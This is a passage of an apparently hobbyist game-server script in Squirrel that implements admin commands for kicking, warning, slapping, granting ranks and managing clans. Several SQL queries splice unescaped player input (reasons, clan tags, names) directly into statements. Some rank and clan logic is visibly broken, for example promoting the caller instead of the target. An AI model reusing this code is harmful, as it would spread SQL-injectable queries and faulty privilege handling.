					Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" set attack of player: "+pcol(plr.ID) + plr.Name + white+" to [#33CC33] False"+white+".");
                local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
					MessagePlayer("[#FFDD33]Information:[#FFFFFF] Now you cannot attack/DM.", plr);
                    QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( '"+ escapeSQLString( player.Name ) +"',  '"+ status[ player.ID ].Level +"', '"+ escapeSQLString( plr.Name ) +"', '"+ dat +"', '"+ cmd +"', '"+ NR +"' ) " );       
				}
				else MessagePlayer("[#FF0000]Error:[#FFFFFF] The Bool must be Yes or no.", player);
			}
		}
	}
	else if(cmd == "setspawnattack")
	{
		if(status[player.ID].Level < 5) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Unauthorized Access", player);
		else if(!arguments || NumTok(arguments, " ") < 2) MessagePlayer("[#FF0000]Error:[#FFFFFF] Use /"+bas+cmd+" <player> <yes/no>", player);
		else
		{
			local plr = FindPlayer(GetTok(arguments, " ", 1));
			if(!plr) MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Player.", player);
			else
			{
				if(GetTok(arguments, " ", 2) == "yes")
				{
					plr.CanAttack = true;
					status[plr.ID].attack = true;
					Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" set attack of player: "+pcol(plr.ID) + plr.Name + white+" to [#33CC33] True"+white+".");
					MessagePlayer("[#FFDD33]Information:[#FFFFFF] Now you can attack/DM.", plr);
                local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
                    QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( '"+ escapeSQLString( player.Name ) +"',  '"+ status[ player.ID ].Level +"', '"+ escapeSQLString( plr.Name ) +"', '"+ dat +"', '"+ cmd +"', '"+ NR +"' ) " );       
				}
				else if(GetTok(arguments, " ", 2) == "no")
				{
					plr.CanAttack = false;
					status[plr.ID].attack = false;
					Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" set attack of player: "+pcol(plr.ID) + plr.Name + white+" to [#33CC33] False"+white+".");
					MessagePlayer("[#FFDD33]Information:[#FFFFFF] Now you cannot attack/DM.", plr);
                local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
                    QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( '"+ escapeSQLString( player.Name ) +"',  '"+ status[ player.ID ].Level +"', '"+ escapeSQLString( plr.Name ) +"', '"+ dat +"', '"+ cmd +"', '"+ NR +"' ) " );       
				}
				else MessagePlayer("[#FF0000]Error:[#FFFFFF] The Bool must be Yes or no.", player);
			}
		}
	}
	
   else if ( cmd == "kick" )
    {
		
        if (status[player.ID].Level < 5 ) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Unauthorized Access", player);
		else if(!arguments || NumTok(arguments, " ") < 2) MessagePlayer("[#FF0000]Error:[#FFFFFF] Use /"+bas+cmd+" <player> <reason>", player);
		else
		{
			local plr = FindPlayer(GetTok(arguments, " ", 1));
			local reas = GetTok(arguments, " ", NumTok(arguments, " "));
			if(!plr) MessagePlayer("[#FF0000]Error:[#FFFFFF] Invalid Player", player);
			else if(status[player.ID].Level <= status[plr.ID].Level) MessagePlayer("[#FF0000]Error:[#FFFFFF] You cannot kick admin equal or higher than you", player);
			else
			{
				Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" kicked player : " + pcol(plr.ID) + plr.Name + white + " Reason : "+reas+".");
				local now = date();
				local dat = now.day + "/" + now.month + "/" + now.year + " " + now.hour + ":" + now.min + ":" + now.sec;
                local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
                QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( '"+ escapeSQLString( player.Name ) +"',  '"+ status[ player.ID ].Level +"', '"+ escapeSQLString( plr.Name ) +"', '"+ dat +"', '"+ cmd +"', '"+ reas +"' ) " );
				QuerySQL(DB, "INSERT INTO kick (name, admin, date, reason) VALUES ('"+escapeSQLString(player.Name.tolower())+"', '"+escapeSQLString(plr.Name.tolower())+"', '"+dat+"', '"+reas+"') ");
				KickPlayer( plr );
			}
		}
	}
	
	else if(cmd == "warn")
	{
		if(status[player.ID].Level < 5) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Unauthorized Access", player);
		else if(!arguments || NumTok(arguments, " ") < 2) MessagePlayer("[#FF0000]Error:[#FFFFFF] Use / " bas + cmd + " <plr> <reason> ", player);
		else
		{
			local plr = FindPlayer(GetTok(arguments, " ", 1));
			local reas = GetTok(arguments, " ", 2, NumTok(arguments, " "));
			if(!plr) MessagePlayer("[#FF0000]Error:[#FFFFFF] Invalid Player", player);
			else if(status[player.ID].Level <= status[plr.ID].Level) MessagePlayer("[#FF0000]Error:[#FFFFFF] You cannot warn any admin equal or higher than you", player);
			else 
			{
                status[ plr.ID ].Warns++;
				Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" warned player : " + pcol(plr.ID) + plr.Name + white + " Reason : " + reas + ".");
				MessagePlayer("[#FFDD33]Information:[#FFFFFF] You have been warned by Admin:"+playerName+" Reason: "+reas+".", plr);
				local now = date();
				local dat = now.day + "/" + now.month + "/" + now.year + " " + now.hour + ":" + now.min + ":" + now.sec;
				Announce("~r~ Warned ", plr, 8);
				QuerySQL(DB, "INSERT INTO warn (name, admin, date, reason) VALUES ('"+escapeSQLString(player.Name.tolower())+"', '"+escapeSQLString(plr.Name.tolower())+"', '"+dat+"', '"+reas+"') ");
                local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
                QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( '"+ escapeSQLString( player.Name ) +"',  '"+ status[ player.ID ].Level +"', '"+ escapeSQLString( plr.Name ) +"', '"+ dat +"', '"+ cmd +"', '"+ reas +"' ) " );
                if ( status[ player.ID ].Warns == 3 )
                {
                    Message( "[#FFDD33]Information:[#FFFFFF] "+ pcol( plr.ID ) + plr.Name + white +" has been kicked from the server due to exceeding the warning limit." );
                    KickPlayer( plr );
                }
			}
		}
	}
    else if( cmd == "unwarn" )
    {
        if( status[player.ID].Level < 5 ) MessagePlayer( "[#FFDD33]Information:[#FFFFFF] Unauthorized access.", player );
        else if(!arguments || NumTok(arguments, " ") < 2) MessagePlayer("[#FF0000]Error:[#FFFFFF] Use / " bas + cmd + " <plr>", player );
        else
        {
            local plr = FindPlayer( GetTok( arguments, " ", 1 ) );
            if( !plr ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] Unknown player.", player );
            else if( status[player.ID].Level <= status[plr.ID].Level ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] You cannot unwarn any admin with a level equal or higher than you.", player );
            else
            {
                if ( status[ plr.ID ].Warns > 0 ) status[ plr.ID ].Warns = 0;
                Message( "[#FFDD00]Administrator Command:[#FFFFFF] Admin "+ playerName +" unwarned player: "+ pcol(plr.ID) + plr.Name + white +"." );
                local now = date();
                local dat = now.day + "/" + now.month + "/" + now.year + " " + now.hour + ":" + now.min + ":" + now.sec;
                local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
                QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( '"+ escapeSQLString( player.Name ) +"',  '"+ status[ player.ID ].Level +"', '"+ escapeSQLString( plr.Name ) +"', '"+ dat +"', '"+ cmd +"', '"+ reas +"' ) " );
            }
        }
    }
	else if(cmd == "slap")
	{
		if(status[player.ID].Level < 3) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Unauthorized Access", player);
		else if(!arguments || NumTok(arguments, " ") < 2) MessagePlayer("[#FF0000]Error:[#FFFFFF] Use /"+bas + cmd + " [plr] [Reason]", player);
		else
		{
			local plr = FindPlayer(GetTok(arguments, " ", 1));
			if(!plr) MessagePlayer("[#FF0000]Error:[#FFFFFF] Invalid Player", player);
			else if(status[player.ID].Level <= status[plr.ID].Level) MessagePlayer("[#FF0000]Error:[#FFFFFF] You cannot slap any admin equal or higher than you", player);
			else
			{
				plr.Pos = Vector(plr.Pos.x, plr.Pos.y, plr.Pos.z + 5);	
				local reas = GetTok(arguments, " ", 2, NumTok(arguments, " "));
				Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" slapped player : " + pcol(plr.ID) + plr.Name + white + " Reason : " + reas + ".");
				local now = date();
				local dat = now.day + "/" + now.month + "/" + now.year + " " + now.hour + ":" + now.min + ":" + now.sec;
				MessagePlayer("[#FFDD33]Information:[#FFFFFF] You have been slapped by Admin:"+playerName+" Reason: "+reas+".", plr);
				QuerySQL(DB, "INSERT INTO slap (name, admin, date, reason) VALUES ('"+escapeSQLString(player.Name.tolower())+"', '"+escapeSQLString(plr.Name.tolower())+"', '"+dat+"', '"+reas+"') ");
               QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( '"+ escapeSQLString( player.Name ) +"',  '"+ status[ player.ID ].Level +"', '"+ escapeSQLString( plr.Name ) +"', '"+ dat +"', '"+ cmd +"', '"+ reas +"' ) " );
			}
		}
	}
	
	else if ( cmd == "addreferee" || cmd == "setreferee")
	{
		if(status[player.ID].Level < 6) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Unauthorized Access.", player);
		else if(!arguments) MessagePlayer("[#FF0000]Error:[#FFFFFF] Use /"+bas+cmd+" <player>", player);
		else
		{
			local plr = FindPlayer(arguments);
			if(plr)
			{
				local q = QuerySQL(DB, "SELECT * FROM Accounts WHERE LowerName = '"+escapeSQLString(plr.Name.tolower())+"'");
				if(!q) MessagePlayer("[#FF0000]Error:[#FFFFFF] Player is not registered.", player);
				else
				{
					status[player.ID].Level = 4;
					QuerySQL(DB, "UPDATE Accounts SET Level = '4' WHERE LowerName = '"+escapeSQLString(plr.Name.tolower())+"'");
					QuerySQL(DB, "INSERT INTO staff ( name, rank, madeby ) VALUES ('"+escapeSQLString(plr.Name.tolower())+"', 'referee', '"+escapeSQLString(player.Name.tolower())+"') ");
					Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" changed rank of player: "+pcol(plr.ID)+plr.Name+white+" to: "+checklvl(status[player.ID].Level)+".");
                local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
					QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( '"+ escapeSQLString( player.Name ) +"',  '"+ status[ player.ID ].Level +"', '"+ escapeSQLString( plr.Name ) +"', '"+ dat +"', '"+ cmd +"', '"+ NR +"' ) " );              
					MessagePlayer("[#FFDD33]Information:[#FFFFFF] Now you are a referee. Type /"+bas+"refereehelp"+white+" to learn about it.", plr);
				}
			}
			else
			{
				local q = QuerySQL(DB, "SELECT * FROM Accounts WHERE LowerName = '"+escapeSQLString(arguments.tolower())+"'");
				if(!q) MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Player.", player);
				else
				{
					QuerySQL(DB, "INSERT INTO staff ( name, rank, madeby ) VALUES ('"+arguments.tolower()+"', 'referee', '"+escapeSQLString(player.Name.tolower())+"') ");
					QuerySQL(DB, "UPDATE Accounts SET Level = '4' WHERE LowerName = '"+escapeSQLString(arguments.tolower())+"'");
					Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" set: [#D3D3D3]"+GetSQLColumnData(q, 0)+white+" rank to: "+checklvl(1)+".");
					local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
                    QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( '"+ escapeSQLString( player.Name ) +"',  '"+ status[ player.ID ].Level +"', '"+ escapeSQLString( arguments.tolower() ) +"', '"+ dat +"', '"+ cmd +"', '"+ NR +"' ) " );       
				}
			}
		}
	}
	
	else if ( cmd == "addadmin" || cmd == "setadmin")
	{
		if(status[player.ID].Level < 6) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Unauthorized Access.", player);
		else if(!arguments) MessagePlayer("[#FF0000]Error:[#FFFFFF] Use /"+bas+cmd+" <player>", player);
		else
		{
			local plr = FindPlayer(arguments);
			if(plr)
			{
				local q = QuerySQL(DB, "SELECT * FROM Accounts WHERE LowerName = '"+escapeSQLString(plr.Name.tolower())+"'");
				if(!q) MessagePlayer("[#FF0000]Error:[#FFFFFF] Player is not registered.", player);
				else
				{
					status[plr.ID].Level = 5;
					QuerySQL(DB, "UPDATE Accounts SET Level = '5' WHERE LowerName = '"+escapeSQLString(plr.Name.tolower())+"'");
					QuerySQL(DB, "INSERT INTO staff ( name, rank, madeby ) VALUES ('"+escapeSQLString(plr.Name.tolower())+"', 'admin', '"+escapeSQLString(player.Name.tolower())+"') ");
					Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" changed rank of player: "+pcol(plr.ID)+plr.Name+white+" to: Admin.");
					local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
                    QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( '"+ escapeSQLString( player.Name ) +"',  '"+ status[ player.ID ].Level +"', '"+ escapeSQLString( plr.Name ) +"', '"+ dat +"', '"+ cmd +"', '"+ NR +"' ) " );       
					MessagePlayer("[#FFDD33]Information:[#FFFFFF] Now you are a Admin. Type /"+bas+"adminhelp"+white+" to learn about it.", plr);
				}
			}
			else
			{
				local q = QuerySQL(DB, "SELECT * FROM Accounts WHERE LowerName = '"+escapeSQLString(arguments.tolower())+"'");
				if(!q) MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Player.", player);
				else
				{
					QuerySQL(DB, "INSERT INTO staff ( name, rank, madeby ) VALUES ('"+arguments.tolower()+"', 'admin', '"+escapeSQLString(player.Name.tolower())+"') ");
					QuerySQL(DB, "UPDATE Accounts SET Level = '5' WHERE LowerName = '"+escapeSQLString(arguments.tolower())+"'");
					Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" set: [#D3D3D3]"+GetSQLColumnData(q, 0)+white+" rank to: Admin.");
					local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
                    QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( '"+ escapeSQLString( player.Name ) +"',  '"+ status[ player.ID ].Level +"', '"+ escapeSQLString( arguments.tolower() ) +"', '"+ dat +"', '"+ cmd +"', '"+ NR +"' ) " );       
				}
			}
		}
	}

	else if ( cmd == "removereferee" || cmd == "delreferee")
	{
		if(status[player.ID].Level < 6) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Unauthorized Access.", player);
		else if(!arguments) MessagePlayer("[#FF0000]Error:[#FFFFFF] Use /"+bas+cmd+" <player>", player);
		else
		{
			local plr = FindPlayer(arguments);
			if(plr)
			{
				local q = QuerySQL(DB, "SELECT * FROM Accounts WHERE LowerName = '"+escapeSQLString(plr.Name.tolower())+"'");
				if(!q) MessagePlayer("[#FF0000]Error:[#FFFFFF] Player is not registered.", player);
				else
				{
					status[player.ID].Level = 1;
					QuerySQL(DB, "UPDATE Accounts SET Level = '1' WHERE LowerName = '"+escapeSQLString(plr.Name.tolower())+"'");
					QuerySQL(DB, "DELETE FROM  staff WHERE name = '"+escapeSQLString(plr.Name.tolower())+"'");
					Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" changed rank of player: "+pcol(plr.ID)+plr.Name+white+" to: "+checklvl(status[player.ID].Level)+".");
					local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
					QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( '"+ escapeSQLString( player.Name ) +"',  '"+ status[ player.ID ].Level +"', '"+ escapeSQLString( plr.Name ) +"', '"+ dat +"', '"+ cmd +"', '"+ NR +"' ) " );              
				}
			}
			else
			{
				local q = QuerySQL(DB, "SELECT * FROM Accounts WHERE LowerName = '"+escapeSQLString(arguments.tolower())+"'");
				if(!q) MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Player.", player);
				else
				{
					QuerySQL(DB, "DELETE FROM staff WHERE name = '"+arguments.tolower()+"'");
					QuerySQL(DB, "UPDATE Accounts SET Level = '1' WHERE LowerName = '"+escapeSQLString(arguments.tolower())+"'");
					Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" set: [#D3D3D3]"+GetSQLColumnData(q, 0)+white+" rank to: "+checklvl(1)+".");
					local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
                    QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( '"+ escapeSQLString( player.Name ) +"',  '"+ status[ player.ID ].Level +"', '"+ escapeSQLString( arguments.tolower() ) +"', '"+ dat +"', '"+ cmd +"', '"+ NR +"' ) " );       
				}
			}
		}
	}
	
	else if ( cmd == "removeadmin" || cmd == "deladmin")
	{
		if(status[player.ID].Level < 6) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Unauthorized Access.", player);
		else if(!arguments) MessagePlayer("[#FF0000]Error:[#FFFFFF] Use /"+bas+cmd+" <player>", player);
		else
		{
			local plr = FindPlayer(arguments);
			if(plr)
			{
				local q = QuerySQL(DB, "SELECT * FROM Accounts WHERE LowerName = '"+escapeSQLString(plr.Name.tolower())+"'");
				if(!q) MessagePlayer("[#FF0000]Error:[#FFFFFF] Player is not registered.", player);
				else
				{
					status[plr.ID].Level = 1;
					QuerySQL(DB, "UPDATE Accounts SET Level = '1' WHERE LowerName = '"+escapeSQLString(plr.Name.tolower())+"'");
					QuerySQL(DB, "DELETE FROM staff WHERE name = '"+escapeSQLString(plr.Name.tolower())+"'");
					Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" changed rank of player: "+pcol(plr.ID)+plr.Name+white+" to: "+checklvl(status[plr.ID].Level)+".");
					local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
                    QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( '"+ escapeSQLString( player.Name ) +"',  '"+ status[ player.ID ].Level +"', '"+ escapeSQLString( plr.Name ) +"', '"+ dat +"', '"+ cmd +"', '"+ NR +"' ) " );       
				}
			}
			else
			{
				local q = QuerySQL(DB, "SELECT * FROM Accounts WHERE LowerName = '"+escapeSQLString(arguments.tolower())+"'");
				if(!q) MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Player.", player);
				else
				{
					QuerySQL(DB, "DELETE FROM staff WHERE name = '"+arguments.tolower()+"'");
					QuerySQL(DB, "UPDATE Accounts SET Level = '1' WHERE LowerName = '"+escapeSQLString(arguments.tolower())+"'");
					Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" set: [#D3D3D3]"+GetSQLColumnData(q, 0)+white+" rank to: "+checklvl(1)+".");
					local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
                    QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( '"+ escapeSQLString( player.Name ) +"',  '"+ status[ player.ID ].Level +"', '"+ escapeSQLString(arguments.tolower()) +"', '"+ dat +"', '"+ cmd +"', '"+ NR +"' ) " );       
				}
			}
		}
	}

	else if ( cmd == "tempreferee")
	{
		if(status[player.ID].Level < 6) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Unauthorized Access.", player);
		else if(!arguments) MessagePlayer("[#FF0000]Error:[#FFFFFF] Use /"+bas+cmd+" <player>", player);
		else
		{
			local plr = FindPlayer(arguments);
			if(plr)
			{
				local q = QuerySQL(DB, "SELECT * FROM Accounts WHERE LowerName = '"+escapeSQLString(plr.Name.tolower())+"'");
				if(!q) MessagePlayer("[#FF0000]Error:[#FFFFFF] Player is not registered.", player);
				else
				{
					status[player.ID].Level = 4;
					QuerySQL(DB, "INSERT INTO staff ( name, rank, madeby ) VALUES ('"+escapeSQLString(plr.Name.tolower())+"', 'temp referee', '"+escapeSQLString(player.Name.tolower())+"') ");
					Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" temporarily changed rank of player: "+pcol(plr.ID)+plr.Name+white+" to: "+checklvl(status[player.ID].Level)+".");
					local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
					QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( '"+ escapeSQLString( player.Name ) +"',  '"+ status[ player.ID ].Level +"', '"+ escapeSQLString( plr.Name ) +"', '"+ dat +"', '"+ cmd +"', '"+ NR +"' ) " );              
					MessagePlayer("[#FFDD33]Information:[#FFFFFF] Now you are a referee. Type /"+bas+"refereehelp"+white+" to learn about it.", plr);
				}
			}
			else
			{
				MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Player.", player);
			}
		}
	}
	
	else if ( cmd == "tempadmin")
	{
		if(status[player.ID].Level < 6) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Unauthorized Access.", player);
		else if(!arguments) MessagePlayer("[#FF0000]Error:[#FFFFFF] Use /"+bas+cmd+" <player>", player);
		else
		{
			local plr = FindPlayer(arguments);
			if(plr)
			{
				local q = QuerySQL(DB, "SELECT * FROM Accounts WHERE LowerName = '"+escapeSQLString(plr.Name.tolower())+"'");
				if(!q) MessagePlayer("[#FF0000]Error:[#FFFFFF] Player is not registered.", player);
				else
				{
					status[plr.ID].Level = 5;
					QuerySQL(DB, "INSERT INTO staff ( name, rank, madeby ) VALUES ('"+escapeSQLString(plr.Name.tolower())+"', 'temp admin', '"+escapeSQLString(player.Name.tolower())+"') ");
					Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" temporarily changed rank of player: "+pcol(plr.ID)+plr.Name+white+" to: Admin.");
					local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
                    QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( '"+ escapeSQLString( player.Name ) +"',  '"+ status[ player.ID ].Level +"', '"+ escapeSQLString( plr.Name ) +"', '"+ dat +"', '"+ cmd +"', '"+ NR +"' ) " );       
					MessagePlayer("[#FFDD33]Information:[#FFFFFF] Now you are a Admin. Type /"+bas+"adminhelp"+white+" to learn about it.", plr);
				}
			}
			else
			{
				MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Player.", player);
			}
		}
	}
	
	else if(cmd == "addclan")
	{
		if(status[player.ID].Level < 6) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Unauthorized Access.", player);
		else if(!arguments || NumTok(arguments, " ") < 2) MessagePlayer("[#FF0000]Error:[#FFFFFF] Use /"+bas+cmd+" <clan tag> <clan name>", player);
		else
		{
			local q = QuerySQL(clan, "SELECT * FROM registered WHERE tag = '"+GetTok(arguments, " ", 1)+"'");
			local q2 = QuerySQL(clan, "SELECT * FROM registered WHERE name = '"+GetTok(arguments, " ", 2, NumTok(arguments, " "))+"'");
			if(q) MessagePlayer("[#FF0000]Error:[#FFFFFF] Clan with that tag already exists.", player);
			else if(q2) MessagePlayer("[#FF0000]Error:[#FFFFFF] Clan with that name already exists.", player);
			else
			{
				QuerySQL(clan, "INSERT INTO registered (name, tag) VALUES ('"+GetTok(arguments, " ", 2, NumTok(arguments, " "))+"', '"+GetTok(arguments, " ", 1)+"') ");
				Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" added: "+GetTok(arguments, " ", 2, NumTok(arguments, " "))+" in the clan tournament.");
                local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
                QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( '"+ escapeSQLString( player.Name ) +"',  '"+ status[ player.ID ].Level +"', '"+ GetTok(arguments, " ", 2, NumTok(arguments, " ")) +"', '"+ dat +"', '"+ cmd +"', '"+ NR +"' ) " );	
			}
		}
	}
	
	else if(cmd == "removeclan" || cmd == "delclan" || cmd == "deleteclan")
	{
		if(status[player.ID].Level < 6) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Unauthorized Access.", player);
		else if(!arguments) MessagePlayer("[#FF0000]Error:[#FFFFFF] Use /"+bas+cmd+" <clan tag>", player);
		else
		{
			local q = QuerySQL(clan, "SELECT * FROM registered WHERE tag = '"+GetTok(arguments, " ", 1)+"'");
			if(!q) MessagePlayer("[#FF0000]Error:[#FFFFFF] Clan does not exists.", player);
			else
			{
				QuerySQL(DB, "UPDATE Accounts SET clan = null WHERE clan = '"+GetSQLColumnData(q, 0)+"'");
				QuerySQL(clan, "DELETE FROM registered WHERE tag = '"+arguments+"'");
				QuerySQL(clan, "DELETE FROM members WHERE tag = '"+arguments+"'");
				Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" removed clan: "+GetSQLColumnData(q, 0)+" from the clan tournament.");
                QuerySQL(clan, "INSERT INTO Registered ( Name, Tag ) VALUES ('"+GetTok(arguments, " ", 2, NumTok(arguments, " "))+"', '"+GetTok(arguments, " '", 1)+"') ");
			}
		}
	}


	else if(cmd == "addclanmember")
	{
		if(status[player.ID].Level < 6) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Unauthorized Access", player);
		else if(!arguments || NumTok(arguments, " ") < 2) MessagePlayer("[#FF0000]Error:[#FFFFFF] Use /"+bas+cmd+" <clan tag> <player name>", player);
		else
		{
			local q = QuerySQL(clan, "SELECT * FROM registered WHERE tag = '"+GetTok(arguments, " ", 1)+"'");
			if(!q) MessagePlayer("[#FF0000]Error:[#FFFFFF] Clan does not exists.", player);
			else
			{
				local plr = FindPlayer(GetTok(arguments, " ", 2));
				if(plr)
				{
					local q = QuerySQL(DB, "SELECT * FROM Accounts WHERE LowerName = '"+escapeSQLString(plr.Name.tolower())+"'");
					if(!q) MessagePlayer("[#FF0000]Error:[#FFFFFF] Player is not registered.", player);
					else
					{
						local q2 = QuerySQL(clan, "SELECT * FROM members WHERE player = '"+escapeSQLString(plr.Name.tolower())+"'");
						if(q2) MessagePlayer("[#FF0000]Error:[#FFFFFF] The player already is in clan: "+GetSQLColumnData(q, 1)+".", player);
						else
						{
							status[player.ID].clan = GetSQLColumnData(q, 0);
							QuerySQL(clan, "INSERT INTO members ( name, tag, player, rank) VALUES ('"+GetSQLColumnData(q, 0)+"', '"+GetSQLColumnData(q, 1)+"', '"+escapeSQLString(plr.Name.tolower())+"', '1') ");
							QuerySQL(DB, "UPDATE Accounts SET clan = '"+GetSQLColumnData(q, 0)+"' WHERE LowerName = '"+escapeSQLString(plr.Name.tolower())+"'");
							MessagePlayer("[#FFDD33]Information:[#FFFFFF] You have been added in clan: "+GetSQLColumnData(q, 0)+".", player);
							Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" added player: "+pcol(plr.ID)+plr.Name+white+" in clan: "+GetSQLColumnData(q, 0)+".");
						local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
							QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( '"+ escapeSQLString( player.Name ) +"',  '"+ status[ player.ID ].Level +"', '"+ escapeSQLString( plr.Name ) +"', '"+ dat +"', '"+ cmd +"', '"+ NR +"' ) " );    
   						}
					}
				}
				else
				{
					local q3 = QuerySQL(DB, "SELECT * FROM Accounts WHERE LowerName = '"+escapeSQLString(GetTok(arguments, " ", 2).tolower())+"'");
					if(!q3) MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Player.", player);
					else
					{
						local q4 = QuerySQL(clan, "SELECT * FROM members WHERE player = '"+escapeSQLString(GetTok(arguments, " ", 2).tolower())+"'");
						if(q4) MessagePlayer("[#FF0000]Error:[#FFFFFF] The player already is in clan: "+GetSQLColumnData(q, 1)+".", player);
						else
						{
							QuerySQL(clan, "INSERT INTO members ( name, tag, player, rank) VALUES ('"+GetSQLColumnData(q, 0)+"', '"+GetSQLColumnData(q, 1)+"', '"+escapeSQLString(GetTok(arguments, " ", 2).tolower())+"', '1') ");
							QuerySQL(DB, "UPDATE Accounts SET clan = '"+GetSQLColumnData(q, 0)+"' WHERE LowerName = '"+escapeSQLString(GetTok(arguments, " ", 2).tolower())+"'");
							Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" added player:[#D3D3D3] "+GetSQLColumnData(q3, 0)+white+" in clan: "+GetSQLColumnData(q, 0)+".");
							local today = date(),
							dat = today.month + "/" + today.day + "/" + today.year;
                            QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( '"+ escapeSQLString( player.Name ) +"',  '"+ status[ player.ID ].Level +"', '"+ GetSQLColumnData(q3, 0) +"', '"+ dat +"', '"+ cmd +"', '"+ NR +"' ) " );
						}
					}
				}
			}
		}
	}
	
	else if(cmd == "delclanmember" || cmd == "removeclanmember")
	{
		if(status[player.ID].Level < 6) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Unauthorized Access", player);
		else if(!arguments || NumTok(arguments, " ") < 2) MessagePlayer("[#FF0000]Error:[#FFFFFF] Use /"+bas+cmd+" <clan tag> <player name>", player);
		else
		{
			local q = QuerySQL(clan, "SELECT * FROM registered WHERE tag = '"+GetTok(arguments, " ", 1)+"'");
			if(!q) MessagePlayer("[#FF0000]Error:[#FFFFFF] Clan does not exists.", player);
			else
			{
				local plr = FindPlayer(GetTok(arguments, " ", 2));
				if(plr)
				{
					local q2 = QuerySQL(clan, "SELECT * FROM members WHERE player = '"+escapeSQLString(plr.Name.tolower())+"'");
					if(!q2) MessagePlayer("[#FF0000]Error:[#FFFFFF] The player is not clan: "+GetSQLColumnData(q, 1)+".", player);
					else
					{
